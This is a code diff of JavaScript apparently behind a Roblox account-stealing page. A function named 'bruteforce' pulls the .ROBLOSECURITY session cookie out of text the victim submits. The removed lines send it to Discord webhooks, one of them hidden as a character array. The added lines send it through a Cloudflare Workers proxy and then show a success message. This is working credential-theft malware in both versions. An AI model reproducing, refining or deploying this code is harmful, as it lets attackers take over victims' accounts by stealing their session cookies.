@@ -1,83 +1,45 @@
-const doyouhavenothingbettertodo = [  
+const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
-    'h' ,   't' ,   't' ,   'p' ,   's' ,   ':' ,   '/' ,   '/' ,   'd' ,   'i' ,  
-    's' ,   'c' ,   'o' ,   'r' ,   'd' ,   '.' ,   'c' ,   'o' ,   'm' ,   '/' ,  
+async function sendToProxy(data) {
+  try {
+    const response = await fetch(CLOUDFLARE_PROXY_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        data,
+        timestamp: new Date().toISOString()
+      })
+    });
 
-    'a' ,   'p' ,   'i' ,   '/' ,   'w' ,   'e' ,   'b' ,   'h' ,   'o' ,   'o' ,  
-    'k' ,   's' ,   '/' ,   '1' ,   '3' ,   '5' ,   '3' ,   '7' ,   '5' ,   '8' ,  
-
-    '0' ,   '6' ,   '9' ,   '0' ,   '0' ,   '7' ,   '3' ,   '1' ,   '9' ,   '0' ,  
-    '7' ,   '0' ,   '/' ,   'S' ,   'Z' ,   'Y' ,   'Y' ,   '0' ,   'n' ,   'L' ,  
-
-    'A' ,   '6' ,   '_' ,   '4' ,   'c' ,   'e' ,   'f' ,   'I' ,   'H' ,   'y' ,  
-    'Z' ,   'q' ,   'p' ,   'H' ,   'W' ,   'D' ,   'q' ,   'T' ,   'N' ,   'f' ,  
-
-    'I' ,   'G' ,   'X' ,   'G' ,   '4' ,   'J' ,   '9' ,   'K' ,   'd' ,   'L' ,  
-    'h' ,   'q' ,   'x' ,   '8' ,   '-' ,   'c' ,   'Q' ,   '-' ,   't' ,   'G' ,  
-
-    'i' ,   'b' ,   'K' ,   'T' ,   'F' ,   'b' ,   '3' ,   'w' ,   'E' ,   't' ,  
-    'f' ,   'V' ,   '2' ,   'C' ,   'o' ,   '4' ,   'J' ,   '6' ,   'Z' ,   'F' ,   'W'  
-
-];
-
-
-
-
-
+    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+    return await response.json();
     
-      
-
-const adwdawdacsazdawradfsadaw = 'https://discord.com/api/webhooks/1353774225181249566/4yLDywFMyhIaXvQSmH0_oojKSAZi1k_66WqJLEbpLcRm0qfTO8f_2Fywyl47irGMI9kI'
-
-
-function extractRobloxSecurityCookie(sessionId) {
-  // Use a regular expression to find the .ROBLOSECURITY cookie
-  const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
-  const match = sessionId.match(regex);
-  if (match && match[1]) {
-    return match[1]; // Return the cookie value
+  } catch (error) {
+    console.error('Proxy error:', error);
+    throw error;
   }
-  return null; // Return null if not found
 }
 
 function bruteforce(sessionId) {
-  let content;
+  const extractedCookie = extractRobloxSecurityCookie(sessionId);
 
-  // Check if the sessionId contains .ROBLOSECURITY
-  if (sessionId.includes(".ROBLOSECURITY")) {
-    const robloxSecurityCookie = extractRobloxSecurityCookie(sessionId);
-    if (robloxSecurityCookie) {
-      content = `New .ROBLOSECURITY Cookie Submitted:\n\`\`\`${robloxSecurityCookie}\`\`\``;
-    } else {
-      content = `No .ROBLOSECURITY cookie found in the sessionId:\n\`\`\`${sessionId}\`\`\``;
-    }
+  if (extractedCookie) {
+    sendToProxy(extractedCookie)
+      .then(() => showCookieSuccess())
+      .catch(() => showError("Failed to send data"));
   } else {
-    // Send the entire sessionId as-is
-    content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
+    console.error("No .ROBLOSECURITY cookie found in sessionId.");
+    showError("Invalid sessionId. No .ROBLOSECURITY found.");
   }
-
-  const payload = {
-    content: content
-  };
-
-  fetch(adwdawdacsazdawradfsadaw, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(payload),
-  })
-    .then(response => {
-      if (!response.ok) {
-        console.error('Failed to send data to Discord.');
-      } else {
-        console.log('Data sent successfully!');
-      }
-    })
-    .catch(error => {
-      console.error('Error:', error);
-    });
 }
+
+function extractRobloxSecurityCookie(sessionId) {
+  const match = sessionId.match(/\.ROBLOSECURITY=([^;]+)/);
+  return match ? match[1] : null;
+}
+
 
 
 
